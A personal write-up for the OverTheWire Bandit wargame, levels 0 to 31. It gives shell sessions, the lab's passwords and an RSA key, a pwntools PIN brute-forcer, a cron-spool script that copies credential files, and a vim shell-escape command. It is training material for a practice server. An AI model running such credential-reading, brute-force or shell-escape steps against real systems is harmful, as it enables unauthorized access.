# Overthewire Bandit Writeup

I try to solve them with one line. One line with password only. (The last line of the history is the one-liner, usually done with bash scripting.)

Notice that password might change as time goes on.

```
SSH Information
Host: bandit.labs.overthewire.org
Port: 2220
```

## Level 0

```
Username: bandit0
Password: bandit0
```

```bash
bandit0@bandit:~$ ls
readme
bandit0@bandit:~$ cat readme
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
```

## Level 1

```bash
bandit1@bandit:~$ ls
-
bandit1@bandit:~$ cat ./-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
bandit1@bandit:~$ export LFILE=-
bash -c 'echo "$(<$LFILE)"'
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
```

## Level 2

```bash
bandit2@bandit:~$ ls
spaces in this filename
bandit2@bandit:~$ cat spaces\ in\ this\ filename 
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
bandit2@bandit:~$ echo "Small trick: type space and press tab to autocomplete" 
Small trick: type space and press tab to autocomplete
```

## Level 3

```bash
bandit3@bandit:~$ ls
inhere
bandit3@bandit:~$ cd inhere/
bandit3@bandit:~/inhere$ ls -al
total 12
drwxr-xr-x 2 root    root    4096 Apr 23 18:04 .
drwxr-xr-x 3 root    root    4096 Apr 23 18:04 ..
-rw-r----- 1 bandit4 bandit3   33 Apr 23 18:04 .hidden
bandit3@bandit:~/inhere$ cat .hidden
2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
```

## Level 4

```bash
bandit4@bandit:~$ ls
inhere
bandit4@bandit:~$ cd inhere/
bandit4@bandit:~/inhere$ ls
-file00  -file02  -file04  -file06  -file08
-file01  -file03  -file05  -file07  -file09
bandit4@bandit:~/inhere$ for i in {0..9}; do cat ./-file0$i; echo; done;       
�Ű��Bη���b<Q�Ƞ�+V�iO�1�[5{�
jmD�B�0D�tQ*��)�A���V �]Ȕl�
x(�z�.T26 F8qqlY���v�FN#��'~
�E�Q�"�p�
����4�}�]��G�A��u[�/9�
�Mrj�S�r_E�,���G+�h|�+
�=>KQ�
2��]o-p8q�츑���D�
                 .~�&ϯ"PT�I
'�cwk^j�����M����;,��co�9
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

�׉ǰ�6=�>>�ӫ�w�<U'=�@��Z�xj
�?3��[ٲN|?�G|b�G�[8�y�-�́*�
                           ��

bandit4@bandit:~/inhere$ for i in {0..9}; do cat ./-file0$i | strings; done;   
.T26
F8qqlY
=>KQ
]o-p8q
cwk^
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
<U'=
bandit4@bandit:~$ for i in {0..9}; do cat ./inhere/-file0$i | strings -n 10 ; done;
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
```

## Level 5

```bash
bandit5@bandit:~$ ls
inhere
bandit5@bandit:~$ cd inhere/
bandit5@bandit:~/inhere$ find . -type f ! -executable -size 1033c
./maybehere07/.file2
bandit5@bandit:~/inhere$ cat $(find . -type f ! -executable -size 1033c)
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                    
bandit5@bandit:~$ cat $(find . -type f ! -executable -size 1033c) | cut -d' ' -f1
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

bandit5@bandit:~$ cat $(find . -type f ! -executable -size 1033c) | cut -d' ' -f1 | xxd
00000000: 5034 4c34 7675 6364 6d4c 6e6d 3849 3756  P4L4vucdmLnm8I7V
00000010: 6c37 6a47 3141 7047 5366 6a59 4b71 4a55  l7jG1ApGSfjYKqJU
00000020: 0a0a                                     ..
bandit5@bandit:~$ cat $(find . -type f ! -executable -size 1033c) | cut -d' \n' -f1
cut: the delimiter must be a single character
Try 'cut --help' for more information.
bandit5@bandit:~$ cat $(find . -type f ! -executable -size 1033c) | cut -d' ' -f1 | cut -d $'\n' -f1
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
```

## Level 6

```bash
bandit6@bandit:/$ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null    
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:/$ cat $(find / -user bandit7 -group bandit6 -size 33c 2>/dev/null)
z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
```

## Level 7

```bash
bandit7@bandit:~$ cat data.txt | grep milliont
millionth       TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep millionth | xxd
00000000: 6d69 6c6c 696f 6e74 6809 5445 534b 5a43  millionth.TESKZC
00000010: 3058 7654 6574 4b30 5339 784e 776d 3235  0XvTetK0S9xNwm25
00000020: 5354 6b35 6957 7242 7650 0a              STk5iWrBvP.
bandit7@bandit:~$ cat data.txt | grep millionth | cut -d $'\t' -f2
TESKZC0XvTetK0S9xNwm25STk5iWrBvP
```

## Level 8

```bash
bandit8@bandit:~$ cat data.txt | sort | uniq -c | sort -n | head
      1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
     10 08Jd2vmb6FjR4zXPteGHhpJm8A0OOA5B
     10 0dEKX1sDwYtc4vyjrKpGu30ecWBsDDa9
     10 0YDTDPCLc585IaFu911ukE9QfD6Ykrlz
     10 0zP9wfUcMKjZM2hiQUYR1nTfmaRdYSQE
     10 11FFcDRW5ZXXmX7geZORYRwiJfj8B3Gh
     10 1jZv2X1O2JypCBIgDNRwWQzS1CyhvByt
     10 1MUdfR7bGGCpNfGEOXaIEdrA8hT2L8Tk
     10 2fepTygKSkWHQJS2GrmGwjyl36eXSWJe
     10 3cTCUFe6MTl1FDAL0Z49cRByfq1MRlxJ
bandit8@bandit:~$ cat data.txt | sort | uniq -c | sort -n | head -n 1
      1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
bandit8@bandit:~$ cat data.txt | sort | uniq -c | sort -n | head -n 1 | xargs | cut -d ' ' -f2
EN632PlfYiZbn3PhVK3XOGSlNInNE00t
```

## Level 9

```bash
bandit9@bandit:~$ strings data.txt | grep =
4========== the#
5P=GnFE
========== password
'DN9=5
========== is
$Z=_
=TU%
=^,T,?
W=y
q=W
X=K,
========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
&S=(
nd?=
bandit9@bandit:~$ strings -n 10data.txt | grep ==
strings: invalid integer argument 10data.txt
bandit9@bandit:~$ strings -n 10 data.txt | grep ==
4========== the#
========== password
========== is
========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
bandit9@bandit:~$ strings -n 10 data.txt | grep == | cut -d $'\n' -f4 | cut -d ' ' -f2
G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
```

## Level 10

```bash
bandit10@bandit:~$ cat data.txt
VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg==
bandit10@bandit:~$ base64 -d data.txt
The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
bandit10@bandit:~$ base64 -d data.txt | cut -d ' ' -f4
6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
```

## Level 11

```bash
bandit11@bandit:~$ cat data.txt | rot13
Command 'rot13' not found, but can be installed with:
apt install bsdgames  # version 2.17-29, or
apt install hxtools   # version 20211204-1
Ask your administrator to install one of them.
bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | cut -d ' ' -f4
JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
```

## Level 12

This level is trash. It's a file that has been zipped/archived 10 times and that's too annoying to do manually. Just a rubbish level.

The solution is use file command multiple times and find the extract command of that type.

Finally the password for level is `wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw`.

If you want a "one shot" script for this shitty problem, here it is:

```bash
xxd -r data.txt data.out
file data.out
mv data.out data.gz
gzip -d data.gz 
file data
bzip2 -d data
file data.out
mv data.out data.gz
gzip -d data.gz
file data
tar -xf data
file data5.bin
tar -xf data5.bin
file data6.bin
bzip2 -d data6.bin
file data6.bin.out
tar -xf data6.bin.out
file data8.bin
mv data8.bin data8.gz
gzip -d data8.gz
file data8
cat data8
```

## Level 13

Gave you a private ssh to level 14.

```bash
ssh  bandit14@bandit.labs.overthewire.org -p 2220 -i <path-to-ssh-key>
```

## Level 14

```bash
bandit14@bandit:~$ cat  /etc/bandit_pass/bandit14
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
bandit14@bandit:~$ nc localhost 30000
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt


bandit14@bandit:~$ nc localhost 30000 < /etc/bandit_pass/bandit14
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

bandit14@bandit:~$ nc localhost 30000 < /etc/bandit_pass/bandit14 | cut -d $'\n' -f2
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
```

## Level 15

```bash
bandit15@bandit:~$ openssl s_client -connect localhost:30001
[REDACTED]
read R BLOCK
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1
```

## Level 16

```bash
bandit16@bandit:~$ nmap -p 31000-32000 localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-26 11:59 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
bandit16@bandit:~$ nc localhost 31046
aaa
aaa
^C
bandit16@bandit:~$ nc localhost 31518
aaa
^C
bandit16@bandit:~$ nc localhost 31691
aaa
aaa
^C
bandit16@bandit:~$ nc localhost 31790
aaa
^C
bandit16@bandit:~$ nc localhost 31960
aaa
aaa
^C
bandit16@bandit:~$ openssl s_client -connect localhost:31518
[REDACTED]
read R BLOCK
aaa
aaa
^C
bandit16@bandit:~$ openssl s_client -connect localhost:31790
[REDACTED]
read R BLOCK
aaa
Wrong! Please enter the correct current password
closed
bandit16@bandit:~$ openssl s_client -connect localhost:31790
[REDACTED]
read R BLOCK
JQttfApK4SeyHwDlI9SXGR50qclOAil1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
```

## Level 17

```bash
bandit17@bandit:~$ diff passwords.new  passwords.old
42c42
< hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
---
> glZreTEH1V3cGKL6g4conYqZqaEj0mte
```

## Level 18

Tricky one! So it modifies `.bashrc` so I cannot use `bash`. However I have `sh`, hahaha!

Login using this command!

```bash
ssh -t bandit18@bandit.labs.overthewire.org -p 2220 '/bin/sh;'
[REDACTED]
$ cat readme
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
```

## Level 19

```bash
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```

## Level 20

Setup a local server to send the password to people who connect to it.

Which is easy by nc (Learned from setting up environment for pwn problems.)

```bash
bandit20@bandit:~$ ncat -kvl 1337 -c "echo VxCazJaVykI6W36BkBU0mJTCM8rR95XT"
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:44994.`
```
(Login ssh with another terminal)

```bash
bandit20@bandit:~$ ./suconnect 1337
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password
```

However, I cannot read the response from `suconnect` (It'll send next level's pass back).

So I have to use the most powerful language in the world, `python`!

Here's a simple socket server (by ChatGPT)

You can put this file in `/tmp/some_folder`

```python
import socket

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific port
server_socket.bind(('localhost', 1337))

# Listen for incoming connections
server_socket.listen()

print("Server is listening on port 1337...")

# Accept incoming connections and handle them
while True:
    # Wait for a client to connect
    client_socket, client_address = server_socket.accept()

    # Send "aaa" to the client
    client_socket.send(b"VxCazJaVykI6W36BkBU0mJTCM8rR95XT")

    # Receive and print the message from the client
    message = client_socket.recv(1024).decode()
    print(f"Received message from {client_address}: {message}")

    # Close the connection with the client
    client_socket.close()
```
And the result is perfect:

```bash
bandit20@bandit:/tmp/oooo$ python3 server.py
Server is listening on port 1337...
Received message from ('127.0.0.1', 43532): NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```

Actually `nc` works but I'm weak XD.

## Level 21

```bash
bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit21@bandit:/etc/cron.d$ cat *
* * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null
* * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * root /usr/bin/cronjob_bandit25_root.sh &> /dev/null
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
cat: otw-tmp-dir: Permission denied
# The first element of the path is a directory where the debian-sa1
# script is located
PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1

# Additional run at 23:59 to rotate the statistics file
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /etc/bandit_pass/bandit22
cat: /etc/bandit_pass/bandit22: Permission denied
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

## Level 22

```bash
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ cat /tmp/$(echo I am user $(whoami) | md5sum | cut -d ' ' -f 1)
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

Wrong? The script is running by 23, so

```bash
bandit22@bandit:~$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

## Level 23

Just use level 22 script to "steal" password. Notice that you have to be fast due to cron.

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:~$ cd  /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ vi ooo
bandit23@bandit:/var/spool/bandit24/foo$ cat ooo
#!/bin/bash
mkdir /tmp/ooooooo
cat /etc/bandit_pass/$(whoami) > /tmp/ooooooo/pass
chmod 755 /tmp/ooooooo/pass
bandit23@bandit:/var/spool/bandit24/foo$ chmod +x ooo
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/ooooooo/pass
cat: /tmp/ooooooo/pass: No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/ooooooo/pass
cat: /tmp/ooooooo/pass: No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/ooooooo/pass
cat: /tmp/ooooooo/pass: No such file or directory
(After some time)
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/ooooooo/pass
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Level 24

Just bruteforce the port 30002 with pwntools.

```python
from pwn import *

r = remote('localhost','30002')

r.recvuntil(b'space.')

for i in range(10000):
    print("Trying",i)
    r.send(b'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ')
    r.sendline('{:04d}'.format(i))
    text = r.recvuntil(b'\n').decode()
    if ('Wrong!' in text):
        pass
    else:
        print(text)
```

However, this script is fxxking slow, about 5 requests per second.

So I'll just analyse it using simple method. Print the large list then pipe it into nc.

However, this method stops working when it tries to 6302 for no reason, it just stuck and no response, that's really strange...

So I tried to sleep for a little while after each request, and it works!

```bash
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Level 25

I've written other's writeup because this challenge is difficult, needs some guessing.

Once you connect to the server, you exit immediately.

The trick is that actually when you enter the server, the server uses `more` to display banner and exit.

In order to be in `more` (not exiting immediately), you have to decrease the terminal size.

Then press v to enter vim mode, then enter `:e /etc/bandit_pass/bandit26` to read the password.

```
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```

Actually there's a hint in /etc/passwd, which is `bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext`, and we can view the source code of showtext.

```bash
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

Interesting.

# Level 26

We are in vim now (following the previous challenge), we need to break out which is well-known.

You can find payload on gtfobins.

```bash
:set shell=/bin/sh|:shell
$ ls
bandit27-do  text.txt
$ whoami
bandit26
$ ls -al
total 44
drwxr-xr-x  3 root     root      4096 Apr 23 18:04 .
drwxr-xr-x 70 root     root      4096 Apr 23 18:05 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
drwxr-xr-x  2 root     root      4096 Apr 23 18:04 .ssh
-rwsr-x---  1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do
-rw-r-----  1 bandit26 bandit26   258 Apr 23 18:04 text.txt
```

And we all know the usage of `bandit27-do`.

Then we have password `YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS`

# Level 27

Most of the writeup online are wrong! You have to specify the port when we are cloning.

```bash
bandit27@bandit:/tmp/o$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit27/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit27-git@localhost's password:
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
bandit27@bandit:/tmp/o$ ls
repo
bandit27@bandit:/tmp/o$ cd repo
bandit27@bandit:/tmp/o/repo$ ls
README
bandit27@bandit:/tmp/o/repo$ cat README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

# Level 28

Simple git show to view git history.

```bash
bandit28@bandit:/tmp/oo$ git clone  ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit28/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit28-git@localhost's password:
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
bandit28@bandit:/tmp/oo$ ls
repo
bandit28@bandit:/tmp/oo$ cd repo/
bandit28@bandit:/tmp/oo/repo$ ls
README.md
bandit28@bandit:/tmp/oo/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/oo/repo$ git show
commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000

    fix info leak

diff --git a/README.md b/README.md
index b302105..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+- password: xxxxxxxxxx
```

# Level 29

The password is not in file nor in git history.

So.. It's in another branch! (I didn't came up with this first.)

The hint is in the log file

```bash
commit 4bd5389f9f2b9e96ba517aa751ee58d051905761 (HEAD -> master, origin/master, origin/HEAD)
```

Checkout to dev and done.

```bash
bandit29@bandit:/tmp/oooooooo/repo$ git branch
* master
bandit29@bandit:/tmp/oooooooo/repo$ git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev
bandit29@bandit:/tmp/oooooooo/repo$ git checkout origin/dev
Note: switching to 'origin/dev'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 13e7356 add data needed for development
bandit29@bandit:/tmp/oooooooo/repo$ git show
commit 13e735685c73e5e396252074f2dca2e415fbcc98 (HEAD, origin/dev, dev)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:40 2023 +0000

    add data needed for development

diff --git a/README.md b/README.md
index 1af21d3..a4b1cf1 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for bandit30 of bandit.
 ## credentials

 - username: bandit30
-- password: <no passwords in production!>
+- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
```

# Level 30

I don't know how to solve this level. I just googled it.

The main point is `git tag`. Gotta learn more about git.

```bash
bandit30@bandit:/tmp/bbb/repo/.git$ bandit30@bandit:/tmp/bbb/repo/.git$ git tag
secret
bandit30@bandit:/tmp/bbb/repo/.git$ git show secret
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
secret
bandit30@bandit:/tmp/bbb/repo/.git$ git show secret
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
```

# Level 31

Just add a file and delete .gitignore.

Simpliest git challenge ever...

```bash
bandit31@bandit:/tmp/b/repo$ vi key.txt
bandit31@bandit:/tmp/b/repo$ git status
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
bandit31@bandit:/tmp/b/repo$ git add .
bandit31@bandit:/tmp/b/repo$ git commit -m "ooo"
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
bandit31@bandit:/tmp/b/repo$ ls -al
total 24
drwxrwxr-x 3 bandit31 bandit31 4096 Apr 26 17:01 .
drwxrwxr-x 3 bandit31 bandit31 4096 Apr 26 17:01 ..
drwxrwxr-x 8 bandit31 bandit31 4096 Apr 26 17:01 .git
-rw-rw-r-- 1 bandit31 bandit31    6 Apr 26 17:01 .gitignore
-rw-rw-r-- 1 bandit31 bandit31   15 Apr 26 17:01 key.txt
-rw-rw-r-- 1 bandit31 bandit31  147 Apr 26 17:01 README.md
bandit31@bandit:/tmp/b/repo$ rm .gitignore
bandit31@bandit:/tmp/b/repo$ git add .
bandit31@bandit:/tmp/b/repo$ git commit -m "ooo"
[master 251d36f] ooo
 2 files changed, 1 insertion(+), 1 deletion(-)
 delete mode 100644 .gitignore
 create mode 100644 key.txt
bandit31@bandit:/tmp/b/repo$ git push -u origin main
error: src refspec main does not match any
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
bandit31@bandit:/tmp/b/repo$ git push
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit31/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
